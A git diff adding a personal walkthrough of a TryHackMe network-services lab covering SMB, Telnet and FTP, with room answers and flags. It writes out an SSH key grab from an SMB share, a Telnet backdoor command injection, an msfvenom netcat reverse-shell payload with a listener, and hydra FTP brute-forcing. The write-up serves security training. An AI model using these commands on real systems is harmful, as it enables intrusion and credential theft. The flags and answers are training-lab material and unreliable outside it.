@@ -1,1 +1,164 @@
-Soon...
+1.Get Connected
+
+A basic knowledge of Linux, and how to navigate the Linux file system, is required for this room. If you think you'll need some 
+help with this, try completing the 'Linux Fundamentals' Module (https://tryhackme.com/module/linux-fundamentals)
+
+Get connected over your OpenVPN Access so you can use your machine.
+Most important info here is GET SOME COFFEE.
+
+2.Understanding SMB
+
+Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. 
+Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers. 
+SMB = Server Message Block Protocol , yeah its not SMBP the P was to expensive.
+
+Answer:Server Message Block,response-request,TCP/IP,Unix
+
+3.Enumerating SMB
+
+Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files. 
+SMB can often be a great starting point for an attacker looking to discover sensitive information — you'd be surprised what 
+is sometimes included on these shares. 
+
+If u clueless about Nmap then do the Nmap Room first.
+
+The following command is to get to know which ports are open :
+nmap machine_ip
+
+The following command is to get to know the SMB values:
+
+enum4linux machine_ip
+
+Answer:3,139/445,WORKGROUP,POLOSMB,6.1,profiles
+
+4.Exploiting SMB
+
+smbclient //machine_ip/shared_folder 
+-U user
+-p port
+
+Learned that "get" command in smb gonna download me the file to the folder i excecuted the smbclient command from and i learned
+that the working from home information.txt file can only be downloaded when i use "" else it shows an error since it only reads the 
+Working and not the entire file name.
+
+cd .ssh
+get id_rsa
+chmod 600 id_rsa
+get "Working From Home Information.txt"
+
+After that u can see the content of the txt or you can use the "more" command to let it show u the content of the file in the CLI.
+
+Oh boy did it took me long to realize that his username is cactus...
+
+ssh -i id_rsa cactus@machine_ip
+
+cat smb.txt
+
+Answer:smbclient //10.10.10.2/secret -U suit -p 445,Y,,ssh,John Cactus,.ssh,id_rsa,THM{smb_is_fun_eh?}
+
+5.Understanding Telnet
+
+older form of SSH with clear text
+
+Answer application protocol,ssh,telnet 10.10.10.3 23,encryption
+
+6.Enumerating Telnet
+
+Terminate Machine from before and start this machine, because they are different.
+
+nmap the new machine 
+
+nmap machine_ip -p 0-65535
+
+telnet machine_ip 8012
+
+Answer:1,8012,tcp,0,a backdoor,skidy
+
+7.Exploiting Telnet
+
+Connect again with telnet and look at the welcome message:
+
+telnet machine_ip 8012
+
+start tcp listener on my own machine that is connecting with the OpenVPN
+sudo tcpdump ip proto \\icmp -i tun0
+
+in the connected telnet session type the following :
+
+.RUN ping your_machin_ip c -1
+
+You gonna see that you received an ICMP package that means we can excecute commands
+
+With the following command we get a payload that we can insert into the telnet session so we can get a shell on the machine that 
+we used telnet on before
+
+msfvenom -p cmd/unix/reverse_netcat lhost=the_ip_of_my_machine lport=4444 R
+
+and the result is the payload we can run in the telnet session but before we need to setup a listener is this case nc on our own 
+machine
+
+nc -lvp 4444
+
+This command has to be run in the telnet session
+
+.RUN mkfifo /tmp/yijrovl; nc the_ip_of_my_machine 4444 0</tmp/yijrovl | /bin/sh >/tmp/yijrovl 2>&1; rm /tmp/yijrovl
+
+now we gonna see a connection
+
+┌──(d0㉿0d)-[~/Desktop/Tryhackme]
+└─$ nc -lvp 4444
+listening on [any] 4444 ...
+connect to [your_own_machine_ip] from (UNKNOWN) [the_ip_of_the_telnet_machine] 53848
+
+now you can use commands like dir and cat to see the flag
+
+Answer:SKIDY'S BACKDOOR.,N,Y,mkfifo,nc -lvp 4444,THM{y0u_g0t_th3_t3ln3t_fl4g}
+
+8.Understanding FTP
+
+File Transfer Protocol has 2 modes and uses port 21.
+
+Answer:client-server,21,2
+
+9.Enumerating FTP
+
+Terminate the old machine and start the new one
+Nmap and enum4linux the new machine
+
+to get the variant of the ftp use the following command:
+
+nmap machine_ip -sV -p 21
+
+connect to the machinje with ftp 
+
+ftp anonymous@machine_ip
+
+just hit enter for no password
+
+mget PUBLIC_NOTICE.txt
+read the txt.
+
+Answer:2,21,vsftpd,PUBLIC_NOTICE.txt,Mike,
+
+10.Exploiting FTP
+
+Use hydra since we know the username we can try to crack it
+
+hydra -t 4 -l mike -P /your/path/to/rockyou.txt -vV Machine_ip ftp
+
+connect with ftp:
+
+ftp mike@machine_ip
+enter password:password
+
+mget ftp.txt
+
+Answer:password,THM{y0u_g0t_th3_ftp_fl4g}
+
+11.Expanding your Knowledge
+
+We did it!Some Sauce to read.
+
+    https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
+    https://attack.mitre.org/techniques/T1210/
+    https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/
